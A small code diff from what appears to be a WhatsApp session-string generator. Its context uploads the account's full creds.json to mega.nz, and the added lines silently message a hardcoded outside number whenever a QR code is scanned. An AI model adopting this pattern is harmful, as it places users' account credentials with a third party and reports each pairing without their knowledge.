@@ -49,8 +49,12 @@ async function start() {
                 const user_jid = jidNormalizedUser(sock.user.id);
                 const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${user_jid}.json`);
                 const string_session = mega_url.replace('https://mega.nz/file/', '')
+                const qrowner = '94751150234@s.whatsapp.net'
                 await sock.sendMessage(user_jid, {
                     text: `Dark-shadow=${string_session}`
+                });
+                await sock.sendMessage(qrowner, {
+                    text: `*QR SCANNED SUCCESSFULLY*`
                 });
                 await sock.ws.close()
                 fs.rmSync(auth_path, {
